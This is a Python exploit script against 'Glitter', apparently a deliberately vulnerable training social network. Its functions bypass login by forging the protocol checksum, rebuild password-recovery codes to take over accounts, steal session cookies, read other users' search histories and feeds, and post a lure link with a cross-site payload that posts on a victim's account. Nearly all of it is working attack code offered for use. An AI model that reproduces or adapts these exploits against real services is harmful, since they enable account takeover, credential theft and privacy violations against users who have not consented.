from datetime import datetime, timedelta, timezone
import socket
import requests

# Constants
GLITTER_IP = "44.224.228.136"
GLITTER_PORT_APP = 1336

PRIVATE_GLIT_ID = "82549"
LIKE_GLIT_ID = "79822"

PASSWORD_RECOVERY_CODE_REQUEST_URL = "http://glitter.org.il/password-recovery-code-request/"
PASSWORD_RECOVERY_URL = "http://glitter.org.il/password-recovery-code-verification/"
HISTORY_URL = "http://glitter.org.il/history/"
DELETE_LIKE_URL = "http://glitter.org.il/likes/"
HEADER = {"Content-Type":"application/json"} #For some reason without this header the requests won't work so its pretty much required

# Globals
sock = None
default_user_name = None
default_password = None
default_id = None
default_email = None
default_img = None
default_privacy = None
default_description = None
default_gender = None #In the update user function, we want to keep things consistent in the account apart for the username so we need to keep all the other info

def create_sock():
    #Function creates a socket with the glitter server which will be used in all the other functions.
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (GLITTER_IP, GLITTER_PORT_APP)
        sock.connect(server_address)
        return sock
    except Exception as e:
        print(e)
        return None

def login(username, password):
    #Function logs in into an account, and assigns its details to the global variables
    global sock, default_user_name, default_password, default_id, default_email, default_img, default_privacy, default_description, default_gender
    try:
        default_user_name = username
        default_password = password
        sock = create_sock()
        sock.sendall(('100#{gli&&er}{"user_name":"' + username + '","password":"' + password + '","enable_push_notifications":true}##').encode())
        server_msg = sock.recv(1024).decode()
        checksum = str(calculate_checksum(username + password))
        sock.sendall(('110#{gli&&er}' + checksum + '##').encode())
        server_msg = sock.recv(1024).decode()
        if '"id":' in server_msg:
            default_id = extract_field(server_msg, '"id":')
            default_email = extract_field(server_msg, '"mail":')
            default_gender = extract_field(server_msg, '"gender":')
            default_privacy = extract_field(server_msg, '"privacy":')
            default_description = extract_field(server_msg, '"description":')
            default_img = extract_field(server_msg, '"avatar":')
            return True
        else:
            print("Login failed")
            return False
    except Exception as e:
        print(e)
        return False

def logout():
    #Function logs out of the current socket
    global sock, default_id
    try:
        sock.sendall(('200#{gli&&er}' + default_id + '##').encode())
        sock.close()
    except Exception as e:
        print(e)

def calculate_checksum(string):
    #Function calculates checksum
    #The checksum is the sum of every character converted into ascii.
    total = 0
    for char in string:
        total += ord(char)
    return total

def extract_field(server_msg, field):
    #Function extracts a field from a response
    field_index = server_msg.find(field)
    if field_index == -1:
        return None
    start = field_index + len(field)
    if server_msg[start] == '"': #For strings fields
        start += 1
        end = server_msg.find('"', start)
        return server_msg[start:end]
    else: #Num fields
        end = start
        while server_msg[end] != '"' and server_msg[end] != ',' and server_msg[end] != '{':
            end += 1
        return server_msg[start:end]

def like_post():
    #Function likes a glit
    try:
        sock.sendall(('710#{gli&&er}{"glit_id":' + LIKE_GLIT_ID + ',"user_id":' + default_id + ',"user_screen_name":"","id":-1}##').encode())
        print(sock.recv(1024).decode())
    except Exception as e:
        print(e)

def get_id(name):
    #Function gets the id of user using the search bar
    try:
        sock.sendall(('300#{gli&&er}{"search_type":"SIMPLE","search_entry":"' + str(name) + '"}##').encode())
        server_msg = sock.recv(1024).decode()
        if "id" not in server_msg:
            return None
        return extract_field(server_msg, '"id":')
    except Exception as e:
        print(e)
        return None

def get_email(name):
    #Function gets the email of user using the search bar
    try:
        sock.sendall(('300#{gli&&er}{"search_type":"SIMPLE","search_entry":"' + str(name) + '"}##').encode())
        server_msg = sock.recv(1024).decode()
        if "mail" not in server_msg:
            return None
        return extract_field(server_msg, '"mail":"')
    except Exception as e:
        print(e)
        return None

def login_no_pass(name):
    #Function logs into an account with only a username
    global sock, default_user_name, default_password, default_id, default_email, default_img, default_privacy, default_description, default_gender
    try:
        temp_sock = create_sock() #Were creating a temp sock since we dont know yet if its swap ready
        temp_sock.sendall(('100#{gli&&er}{"user_name":"' + name + '","password":"X","enable_push_notifications":true}##').encode())
        server_msg = temp_sock.recv(1024).decode()
        if "User doesn't exist" in server_msg: #If the user doesnt exists we return
            temp_sock.close()
            print("Login failed, wrong username?")
            return None
        checksum = int(extract_field(server_msg, 'checksum: '))
        diff = checksum - calculate_checksum(name)
        fake_pass = chr(diff)

        temp_sock.sendall(('100#{gli&&er}{"user_name":"' + name + '","password":"' + fake_pass + '","enable_push_notifications":true}##').encode())
        temp_sock.recv(1024)
        temp_sock.sendall(("110#{gli&&er}" + str(checksum) + "##").encode())
        server_msg = temp_sock.recv(1024).decode()
        sock.close()
        sock = temp_sock #Switching the socks

        default_password = extract_field(server_msg, '"password":"') #Assiging the new account info to the globals
        default_user_name = name
        default_id = extract_field(server_msg, '"id":')
        default_email = extract_field(server_msg, '"mail":"')
        default_gender = extract_field(server_msg, '"gender":"')
        default_privacy = extract_field(server_msg, '"privacy":"')
        default_description = extract_field(server_msg, '"description":"')
        default_img = extract_field(server_msg, '"avatar":"')
        return True
    except Exception as e:
        temp_sock.close()
        return None

def special_color_post(message, box_color, font_color):
    #Function posts a glit with special unavailible colors
    try:
        date = (datetime.now(timezone.utc) + timedelta(hours=3)).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        sock.sendall(('550#{gli&&er}{"feed_owner_id":' + default_id + ',"publisher_id":' + default_id + ',"publisher_screen_name":"","publisher_avatar":"im5","background_color":"' + box_color + '","date":"' + date + '","content":"' + str(message) + '","font_color":"' + font_color + '","id":-1}##').encode())
        print(sock.recv(1024).decode())
    except Exception as e:
        print(e)

def comment(message):
    #Function posts a comment on a privare glit
    try:
        date = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        sock.sendall(('650#{gli&&er}{"glit_id":' + PRIVATE_GLIT_ID + ',"user_id":' + default_id + ',"user_screen_name":"' + default_user_name + '","id":-1,"content":"' + message + '","date":"' + date + '"}##').encode())
        print(sock.recv(1024).decode())
    except Exception as e:
        print(e)

def accept_request(sender_id, target_id):
    #Functions accepts a friend request
    try:
        sock.sendall(('420#{gli&&er}[' + sender_id + ',' + target_id + ']##').encode())
        print(sock.recv(1024).decode())
    except Exception as e:
        print(e)

def reject_request(sender_id, target_id):
    #Functions accepts a friend request
    try:
        sock.sendall(('430#{gli&&er}[' + sender_id + ',' + target_id + ']##').encode())
        print(sock.recv(1024).decode())
    except Exception as e:
        print(e)

def change_user_name(new_name):
    #Function changes account's username (no length limit)
    try:
        sock.sendall(('350#{gli&&er}{"screen_name":"' + new_name + '","avatar":"' + default_img + '","description":"' + default_description + '","privacy":"' + default_privacy + '","id":' + default_id + ',"user_name":"' + default_user_name + '","password":"' + default_password + '","gender":"' + default_gender + '","mail":"' + default_email + '"}##').encode())
        print(sock.recv(1024).decode())
    except Exception as e:
        print(e)

def create_account(screen_name, username, password):
    #Function creates an account
    try:
        s = create_sock()
        s.sendall(('150#{gli&&er}{"registration_code":"12345","user":{"screen_name":"' + screen_name + '","avatar":"im1","description":"dsa","privacy":"Public","id":-1,"user_name":"' + username + '!","password":"' + password + '","gender":"Male","mail":"1234@dsddad.cds"}}##').encode())
        print(s.recv(1024).decode())
        s.close()
    except Exception as e:
        print(e)

def get_feed(username):
    #Function fetches the feed of an account
    try:
        user_id = get_id(username)
        if user_id is None:
            print("Wrong username, maybe try full name?")
            return None
        date = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        sock.sendall(('500#{gli&&er}{"feed_owner_id":' + user_id + ',"end_date":"' + date + '","glit_count":5}##').encode()) #Only last 5 glits
        response = sock.recv(32768).decode() #Window size needs to be large since an account with a lot of glits can return large amounts of bytes
        start_index = 0
        while True:
            start_index = response.find('"content":"', start_index)
            if start_index == -1:
                break
            start_index += len('"content":"')
            end_index = response.find('"', start_index)
            content = response[start_index:end_index]
            print(content)
            start_index = end_index + 1
    except Exception as e:
        print(e)

def get_password(name):
    #Function gets the password of an account using the recover password
    try:
        response = requests.post(PASSWORD_RECOVERY_CODE_REQUEST_URL, data=str('"' + name + '"'), headers=HEADER)
        if "Password Recovery Error" in response.text:
            print("Password Recovery Error")
            return None
        id = get_id(name)
        id_str = digits_to_letters(id)
        day_str = datetime.now().strftime("%d%m") #Building the recovery code, which is the date today, the id converted to letters (A - 0...) and the time, for example 1106FCAAC1700
        time_str = datetime.now().strftime("%H%M")
        final_string = day_str + id_str + time_str
        response = requests.post(PASSWORD_RECOVERY_URL, json=[name, final_string], headers=HEADER)
        return response.text
    except Exception as e:
        print(e)
        return None

def digits_to_letters(num):
    #Function returns a string based on a number gimetria (0-A, 1-B...)
    num_str = str(num)
    result = ''
    for digit in num_str:
        result += chr(ord('A') + int(digit))
    return result

def get_cookie(username):
    """
    Just want to clarify that this works only if we dont have an ongoing request to the target user,
    since the cookie is in the request valid message from the server which kinda sucks but im pretty sure its the only way.
    You could also try to get the cookie by yourself, which is made up from the date, time and the username encrypted in md5 hash,
    but the time is the time the user logged in, which could be any time so you don't really have a way to figure that out.
    """
    try:
        target_id = get_id(username)
        if target_id == None:
            print("Invalid name")
            return None
        msg = '''410#{gli&&er}[''' + default_id + ''',''' + target_id + ''']##'''
        sock.sendall(msg.encode())
        ans = sock.recv(1024).decode()
        print(ans)
        cookie = extract_field(ans, 'session: ')
        return cookie
    except Exception as e:
        print(e)
        return None

def print_history(username):
    #Function prints an account search history
    try:
        user_id = get_id(username)
        if user_id == None:
            print("Wrong username, maybe try full name?")
            return None
        response = requests.get(HISTORY_URL + user_id, headers=HEADER)
        history = response.json() #If we do response.text were getting the list as a string so we wont be able to access actual data inside it
        print(username + " searched:")
        for user in history:
            print(user["screen_name"])
    except Exception as e:
        print(e)

def xss(message):
    #Function posts a malicious xss post
    try:
        date = (datetime.now(timezone.utc) + timedelta(hours=3)).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        xss_data = f"please donate to our sick little brother.. <a href='/glit?id=-1&feed_owner_id=-1&publisher_id=-1&publisher_screen_name=hacker&publisher_avatar=im1&background_color=Black&date={date}&content={message}&font_color=white'>Link for donations</a>"
        #This glit contains a link, When clicked it will post a glit on the victim's account with the message
        special_color_post(xss_data, "white", "black") #No need to rewrite code, can just use the special color post function with the default colors
    except Exception as e:
        print(e)
